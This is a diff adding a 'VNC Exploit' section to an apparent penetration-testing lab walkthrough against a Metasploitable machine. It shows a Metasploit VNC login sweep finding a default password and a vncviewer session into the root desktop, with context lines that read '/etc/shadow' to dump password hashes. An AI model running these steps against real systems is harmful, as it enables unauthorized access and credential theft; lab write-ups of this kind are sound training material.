@@ -212,3 +212,44 @@ whoami    # root
 cat /etc/shadow  # Dump password hashes
 ```
 
+
+
+
+# 6. VNC Exploit 
+```bash
+msf6 > use auxiliary/scanner/vnc/vnc_login
+msf6 auxiliary(scanner/vnc/vnc_login) > set RHOSTS 172.16.6.128
+RHOSTS => 172.16.6.128
+msf6 auxiliary(scanner/vnc/vnc_login) > set RPORT 5900
+RPORT => 5900
+msf6 auxiliary(scanner/vnc/vnc_login) > run
+[*] 172.16.6.128:5900     - 172.16.6.128:5900 - Starting VNC login sweep
+[!] 172.16.6.128:5900     - No active DB -- Credential data will not be saved!
+[+] 172.16.6.128:5900     - 172.16.6.128:5900 - Login Successful: :password
+[*] 172.16.6.128:5900     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/vnc/vnc_login) > 
+
+```
+### Now for get into the target machine -->
+
+```bash
+┌──(durjoy㉿Kali)-[~]
+└─$ vncviewer 172.16.6.128:5900
+
+Connected to RFB server, using protocol version 3.3
+Performing standard VNC authentication
+Password: 
+Authentication successful
+Desktop name "root's X desktop (metasploitable:0)"
+VNC server default format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using default colormap which is TrueColor.  Pixel format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+```
+![image](https://github.com/user-attachments/assets/2360319a-be04-4619-8767-ed99180a5dd9)
+
